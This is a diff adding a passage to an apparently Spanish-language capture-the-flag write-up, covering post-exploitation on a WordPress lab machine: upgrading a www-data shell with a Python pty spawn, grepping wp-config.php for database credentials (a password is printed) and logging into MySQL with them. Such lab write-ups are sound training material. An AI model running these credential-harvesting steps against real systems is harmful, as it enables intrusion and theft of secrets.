@@ -114,7 +114,43 @@ www-data
 www-data@reto02:/var/www/html/wp1$ 
 
 ```
+comprobamos que hay un usuario al intentar ir al lugar d el primera flag, el usuario es `steve`, pero no tenemos permisos para ver dentro de sus carpetas, pero primero para poder hacer más ineractiva la shell ejecutamos dentro de la shell
 
+```shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```shell
+www-data@reto02:/home$ cat /var/www/html/wp1/wp-config.php | grep DB_
+cat /var/www/html/wp1/wp-config.php | grep DB_
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'wordpress' );
+define( 'DB_PASSWORD', '9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r' );
+define( 'DB_HOST', 'localhost' );
+define( 'DB_CHARSET', 'utf8mb4' );
+define( 'DB_COLLATE', '' );
+
+```
+
+```shell
+www-data@reto02:/home$ mysql -u wordpress -p'9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r'
+<dpress -p'9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 23511
+Server version: 8.0.39-0ubuntu0.24.04.2 (Ubuntu)
+
+Copyright (c) 2000, 2024, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> 
+
+```
 
 ### Flag 3
 
